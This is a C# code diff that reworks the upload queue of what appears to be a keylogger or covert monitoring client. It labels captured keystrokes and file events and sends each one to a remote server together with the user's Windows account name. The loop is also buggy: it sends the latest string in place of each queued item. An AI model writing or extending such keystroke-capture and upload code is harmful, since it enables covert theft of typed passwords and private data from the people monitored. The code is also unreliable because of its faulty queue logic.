@@ -11,24 +11,39 @@ namespace Client.Communication
     /// </summary>
     public static class String_Stacker
     {
-        private static List<string> _sdata = new List<string>();
-        public static async void Send(string sdata)
+        public enum StringType
         {
-            _sdata.Add(sdata);
+            Keylog, FileEvent
+        }
+        private static List<Tuple<string, StringType>> _sdata = new List<Tuple<string, StringType>>();
+        public static async void Send(string sdata, StringType type)
+        {
+            var data = new Tuple<string, StringType>(sdata, type);
+            _sdata.Add(data);
             await Task.Run(() =>
             {
+                bool failed = false;
                 /// Make sure they are sent in order.
                 foreach (var i in _sdata.ToList())
                 {
-                    if (Server.AsyncSendKeylogs(sdata, Environment.UserName).Result)
+                    switch (i.Item2)
                     {
-                        _sdata.Remove(i);
+                        case StringType.Keylog:
+                            if (Server.AsyncSendString(sdata, Environment.UserName, "logs").Result)
+                            {
+                                _sdata.Remove(i);
+                            }
+                            else failed = true;
+                            break;
+                        case StringType.FileEvent:
+                            if (Server.AsyncSendString(sdata, Environment.UserName, "fileevent").Result)
+                            {
+                                _sdata.Remove(i);
+                            }
+                            else failed = true;
+                            break;
                     }
-                    /// Didn't send, maybe try in the next request.
-                    else
-                    {
-                        break;
-                    }
+                    if (failed) break;
                 }
             });
         }
